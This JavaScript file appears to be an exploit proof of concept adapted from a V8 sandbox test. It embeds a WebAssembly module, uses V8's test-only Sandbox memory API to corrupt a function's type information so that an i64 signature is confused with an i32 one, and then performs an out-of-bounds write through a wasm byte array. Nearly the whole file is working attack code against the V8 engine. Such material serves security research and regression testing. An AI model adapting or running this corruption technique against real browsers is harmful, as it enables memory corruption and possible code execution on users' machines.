// barely changed version of v8 sandbox test liftoff-wasmaray-i64-indexing.js
// import("flag")

// var wasm_code = read("exp.wasm", "binary");

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,40,6,80,0,94,120,1,80,0,96,1,126,1,127,80,0,96,1,126,1,126,96,1,127,1,100,0,96,2,100,0,126,1,127,96,3,100,0,126,127,0,3,6,5,1,2,3,4,5,4,10,1,64,0,112,1,1,1,210,1,11,7,57,5,6,102,110,95,105,95,108,0,0,6,102,110,95,108,95,108,0,1,11,97,108,108,111,99,95,117,56,97,114,114,0,2,9,117,56,97,114,114,95,103,101,116,0,3,9,117,56,97,114,114,95,115,101,116,0,4,10,51,5,4,0,65,0,11,4,0,32,0,11,7,0,32,0,251,7,0,11,14,0,32,0,32,1,65,0,17,1,0,251,13,0,11,16,0,32,0,32,1,65,0,17,1,0,32,2,251,14,0,11,0,59,4,110,97,109,101,1,52,5,0,6,102,110,95,105,95,108,1,6,102,110,95,108,95,108,2,11,97,108,108,111,99,95,117,56,97,114,114,3,9,117,56,97,114,114,95,103,101,116,4,9,117,56,97,114,114,95,115,101,116]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmGlobalObjectTaggedBufferOffset = 0x14;
const kFixedArrayElement0Offset = 0x8;
const kMapOffset = 0;
const kFuncRefMapTypeInfoOffset = 0x14;
const kTypeInfoSupertypesOffset = 0x10;

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function getObj(ofs) {
  return Sandbox.getObjectAt(ofs);
}

function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}

function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let {fn_i_l, fn_l_l, alloc_u8arr, u8arr_get, u8arr_set} = wasm_instance.exports;

function extract_wasmglobal_value(global) {
  let pbuf = getField(getPtr(global), kWasmGlobalObjectTaggedBufferOffset);
  let pval = getField(pbuf, kFixedArrayElement0Offset);
  return pval;
}

function set_supertype(sub_fn, super_fn) {
  let g = new WebAssembly.Global({value: 'anyfunc', mutable: true});

  g.value = sub_fn;
  let funcref_sub = extract_wasmglobal_value(g);                    // WASM_FUNC_REF_TYPE
  let map_sub = getField(funcref_sub, kMapOffset);                  // Map of WASM_FUNC_REF_TYPE
  let typeinfo_sub = getField(map_sub, kFuncRefMapTypeInfoOffset);  // WASM_TYPE_INFO_TYPE

  g.value = super_fn;
  let funcref_sup = extract_wasmglobal_value(g);
  let map_sup = getField(funcref_sup, kMapOffset);

  // typeinfo_sub.supertypes[0] = map_sup
  setField(typeinfo_sub, kTypeInfoSupertypesOffset, map_sup);
}

// set $sig_l_l <: $sig_i_l
set_supertype(fn_l_l, fn_i_l);

// alloc u8arr of length 0x100000.
let u8arr = alloc_u8arr(0x100000);

// // oob write
let MASK64 = (1n<<64n)-1n;

function write8(ptr, val) {
  u8arr_set(u8arr, ptr & MASK64, val);
}


// Try to write at a huge offset; this should get truncated to 32-bit and succeed.
write8(0x424200012345n, 0x43);
